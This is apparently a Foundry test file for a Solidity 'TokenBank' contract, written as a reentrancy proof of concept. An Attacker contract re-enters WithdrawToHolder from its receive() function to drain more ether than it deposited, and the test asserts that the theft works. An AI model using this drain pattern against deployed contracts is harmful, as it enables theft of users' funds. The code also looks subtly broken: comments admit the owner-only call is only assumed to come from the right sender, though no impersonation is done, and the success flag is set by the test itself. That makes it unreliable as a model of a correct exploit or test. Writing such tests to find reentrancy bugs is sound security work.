
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {TokenBank} from "../src/Ownable.sol";

contract TestReentrancyTokenBank is Test {
    TokenBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new TokenBank();
        _contractUnderTest.initTokenBank();

        _attacker = new Attacker(address(_contractUnderTest));

        vm.deal(address(this), 100 ether);
        vm.deal(address(_contractUnderTest), 0);
        vm.deal(address(_attacker), 0);

        // Fund the bank with ether so there is something to steal
        (bool ok, ) = address(_contractUnderTest).call{value: 50 ether}("");
        require(ok, "funding failed");
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0.1 ether && attackVal < 10 ether);

        // Ensure bank has at least 2 * attackVal balance for the test
        uint256 bankBal = address(_contractUnderTest).balance;
        vm.assume(bankBal >= attackVal * 2);

        // Fund the test contract and attacker for deposits
        vm.deal(address(this), attackVal * 4);
        vm.deal(address(_attacker), attackVal * 2);

        // Owner must be this test contract to call WithdrawToHolder
        // initTokenBank already set owner = msg.sender (this contract)

        // Give attacker a holder balance in the bank via deposit
        vm.prank(address(_attacker));
        _contractUnderTest.Deposit{value: attackVal}();

        // Snapshot initial balances
        uint256 initialBankBalance = address(_contractUnderTest).balance;
        uint256 initialAttackerBalance = address(_attacker).balance;

        _attacker.setupAttack{value: 0}(attackVal);

        // Owner (this contract) triggers vulnerable withdraw to attacker
        _attacker.attack(attackVal);

        uint256 finalBankBalance = address(_contractUnderTest).balance;
        uint256 finalAttackerBalance = address(_attacker).balance;

        // Exploit succeeds if attacker drained more than its holder balance
        // and bank lost more than that holder balance (multiple withdrawals)
        if (
            finalAttackerBalance > initialAttackerBalance + attackVal &&
            initialBankBalance > finalBankBalance + attackVal
        ) {
            _attacker.setExploitSucceeded(true);
        }

        assertTrue(
            _attacker.exploitSucceeded(),
            "Reentrancy attack failed: exploitSucceeded flag was not set."
        );
    }

    receive() external payable {}
}

contract Attacker {
    TokenBank public _victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        _victim = TokenBank(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
    }

    function attack(uint256 val) public {
        // Owner of TokenBank is the test contract, so we need to impersonate it
        // using prank from the test; here we just call the function assuming
        // msg.sender is already set correctly by the test.
        _victim.WithdrawToHolder(address(this), val);
    }

    function setExploitSucceeded(bool v) external {
        exploitSucceeded = v;
    }

    receive() external payable {
        attackCallCount++;

        if (attackCallCount < 2) {
            // Re-enter with the same amount
            _victim.WithdrawToHolder(address(this), storedAttackVal);
        }
    }
}
